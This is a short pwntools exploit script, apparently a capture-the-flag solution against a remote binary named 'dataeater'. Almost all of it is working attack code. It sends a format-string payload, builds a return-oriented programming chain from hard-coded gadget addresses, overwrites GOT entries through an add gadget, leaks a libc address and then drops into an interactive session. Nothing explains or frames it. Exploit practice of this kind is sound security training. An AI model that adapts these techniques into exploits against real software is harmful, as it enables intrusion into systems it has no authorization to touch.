from pwn import *

elf = ELF('./dataeater')
# p = elf.process()

p = remote('mc.ax', 31869)

leave_ret = 0x400722
pop6 = 0x40078a					# pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
add_gadget = 0x400628			# add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
pop_rdi = 0x400793
pop_rsi_r15 = 0x400791

p.sendline(b'%4$s' + b'\x00')

payload = b'%4$s%12$s'
payload = payload.ljust(0x10, b'\x00')
payload += p64(elf.got['__stack_chk_fail'])
payload += p64(pop6)
payload += p64(0x7a560)			# Bruteforce this value (offset to write)
payload += p64(elf.got['fgets'] + 0x3d)
payload += p64(0)*4
payload += p64(add_gadget)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi_r15)
payload += p64(elf.got['__isoc99_scanf'])
payload += p64(0)
payload += p64(elf.sym['fgets'])

p.sendline(payload)

payload = b'a'*8 				# __stack_chk_fail@got
payload += p32(leave_ret)		# memset@got

p.sendline(payload)

libc_leak = u64(p.recvuntil(b'\x7f').ljust(8, b'\x00'))
print(hex(libc_leak))			# scanf address

p.interactive()